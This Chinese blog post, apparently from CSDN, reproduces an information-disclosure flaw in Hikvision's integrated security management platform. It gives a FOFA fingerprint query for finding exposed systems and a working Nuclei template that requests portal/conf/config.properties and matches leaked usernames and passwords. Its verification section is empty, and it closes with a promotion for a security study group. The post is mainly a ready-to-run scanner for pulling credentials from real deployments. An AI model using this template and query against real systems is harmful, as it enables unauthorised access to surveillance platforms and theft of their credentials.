# 原创
：  漏洞复现-海康威视综合安防管理平台信息泄露【附Poc】

# 漏洞复现-海康威视综合安防管理平台信息泄露【附Poc】

**目录**

[【产品介绍】](#%E3%80%90%E4%BA%A7%E5%93%81%E4%BB%8B%E7%BB%8D%E3%80%91)

[【产品系统UI】](#%E3%80%90%E4%BA%A7%E5%93%81%E7%B3%BB%E7%BB%9FUI%E3%80%91)

[【漏洞说明】](#%E3%80%90%E6%BC%8F%E6%B4%9E%E8%AF%B4%E6%98%8E%E3%80%91)

[【指纹】](#%E3%80%90%E6%8C%87%E7%BA%B9%E3%80%91)

[【Nuclei Poc】](#%E3%80%90Nuclei%20Poc%E3%80%91)

[【验证】](#%E3%80%90%E9%AA%8C%E8%AF%81%E3%80%91)

---


### 【产品介绍】

海康威视（Hikvision）是一家总部位于中国杭州的公司，是全球最大的视频监控产品供应商。除了传统的CCTV摄像机和网络摄像机，海康威视还提供各种相关的安防产品和解决方案。他们的综合安防管理平台为用户提供了一站式的解决方案，包括视频监控、入侵检测、访客管理、停车场管理等。

### 【产品系统UI】

### 【漏洞说明】

海康威视综合安防平台portal/conf/config.properties接口存在敏感信息泄露

### 【指纹】

app=”HIKVISION-综合安防管理平台”

### 【Nuclei Poc】

```
id: hikvision-information

info:
  name: hikvision-information
  author: xxx
  severity: info
  description: 
  metadata:
    fofa-query: app="HIKVISION-综合安防管理平台"

requests:
  - method: GET
    path:
      - "{{BaseURL}}portal/conf/config.properties"

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - '@bic'
          - 'username'
          - 'password'                    
      - type: status
        status:
          - 200

```

### 【验证】

点赞+在看支持一下吧~感谢看官老爷~ 

 [+V【zkaq222】或者下面的扫码不然通不过哦，免费领取安全学习资料包！（私聊进群一起学习，共同进步）腾讯文档-在线文档<img alt="icon-default.png?t=N7T8" src="https://csdnimg.cn/release/blog_editor_html/release2.3.6/ckeditor/plugins/CsdnLink/icons/icon-default.png?t=N7T8"/>https://docs.qq.com/doc/DYmVETWlZemh0Ymdv](https://docs.qq.com/doc/DYmVETWlZemh0Ymdv)
